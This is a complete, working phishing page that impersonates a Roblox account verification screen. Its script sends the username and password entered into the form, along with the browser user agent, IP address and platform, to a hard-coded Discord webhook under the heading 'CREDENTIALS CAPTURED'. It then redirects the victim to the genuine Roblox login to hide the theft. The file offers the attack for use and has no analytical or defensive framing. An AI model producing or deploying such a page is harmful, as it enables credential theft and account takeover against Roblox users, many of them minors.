<!DOCTYPE html>
<html>
<head>
    <title>Roblox Security Verification</title>
    <style>
        body {
            background: linear-gradient(135deg, #107c10, #004400);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background: rgba(0, 0, 0, 0.6);
            padding: 40px;
            border-radius: 15px;
            width: 350px;
            text-align: center;
            border: 2px solid #00ff00;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #00ff00;
            border-radius: 5px;
            background: rgba(0, 0, 0, 0.5);
            color: white;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #00ff00;
            border: none;
            border-radius: 5px;
            color: black;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
        }
        .logo {
            font-size: 24px;
            font-weight: bold;
            color: #00ff00;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">ROBLOX SECURITY</div>
        <h3>Account Verification Required</h3>
        <p>Please confirm your identity to continue</p>
        
        <input type="text" id="username" placeholder="Username or Email" required>
        <input type="password" id="password" placeholder="Password" required>
        <button onclick="verifyIdentity()">Verify Identity</button>
    </div>

    <script>
        function verifyIdentity() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if(username && password) {
                // –í—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ –¥–∞–Ω—ñ –Ω–∞ Discord
                sendToDiscord(username, password);
                
                // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—î–º–æ –Ω–∞ —Å–ø—Ä–∞–≤–∂–Ω—ñ–π Roblox
                setTimeout(() => {
                    window.location.href = 'https://www.roblox.com/login';
                }, 1500);
            }
        }

        function sendToDiscord(username, password) {
            // –¢–í–Ü–ô DISCORD WEBHOOK
            const webhookURL = 'https://discord.com/api/webhooks/1410236047388049448/2-ih8qLMpj_9WDNKMQtn5KUYhtN5dAL-Q-j0bNuWFddeZRdNMai6qlQ5nMZhwOSj2COS';
            
            const data = {
                content: '**üéØ NEW ROBLOX LOGIN**',
                embeds: [{
                    title: 'üîê CREDENTIALS CAPTURED',
                    description: `**Username:** \`${username}\`\n**Password:** \`${password}\`\n**Browser:** \`${navigator.userAgent}\``,
                    color: 65280,
                    timestamp: new Date().toISOString(),
                    footer: { text: 'Roblox Security Scanner' }
                }]
            };

            // –í—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ –¥–∞–Ω—ñ
            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });

            // –û—Ç—Ä–∏–º—É—î–º–æ IP –∞–¥—Ä–µ—Å—É
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(ipData => {
                    const ipEmbed = {
                        content: '**üåê NETWORK INFORMATION**',
                        embeds: [{
                            title: 'Additional Data',
                            description: `**IP Address:** \`${ipData.ip}\`\n**Platform:** \`${navigator.platform}\``,
                            color: 255,
                            timestamp: new Date().toISOString()
                        }]
                    };
                    
                    fetch(webhookURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(ipEmbed)
                    });
                });
        }
    </script>
</body>
</html>
